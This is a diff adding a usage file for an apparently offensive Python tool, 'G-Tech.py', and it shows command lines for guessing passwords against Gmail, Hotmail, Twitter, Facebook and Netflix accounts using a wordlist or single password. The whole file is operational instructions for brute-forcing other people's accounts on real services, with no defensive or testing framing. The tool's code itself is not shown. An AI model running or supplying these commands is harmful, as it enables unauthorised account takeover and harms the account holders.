@@ -1,0 +1,32 @@
+--Gmail--
+
+python3 G-Tech.py -g/--gmail accounthere@gmail.com -l wordlist here
+python3 G-Tech.py -g/--gmail accounthere@gmail.com -l single password here
+ 
+
+--Hotmail--
+
+python3 G-Tech.py -t/--hotmail accounthere@hotmail -l wordlist here
+python3 G-Tech.py -t/--hotmail accounthere@hotmail -l single password here
+
+
+
+--Twitter--
+
+ python3 G-Tech.py -T/--twitter accountnamehere -l wordlist here
+ python3 G-Tech.py -T/--twitter accountnamehere -l single password here
+
+
+
+--Facebook--
+
+python3 G-Tech.py -f/--facebook accountnamehere/username -l wordlist here
+python3 G-Tech.py -f/--facebook accountnamehere/username -l single password here
+
+
+
+--Netflix--
+
+
+python3 G-Tech.py -n/--netflix accountnamehere -l wordlist here
+python3 G-Tech.py -n/--netflix accountnamehere -l single password here
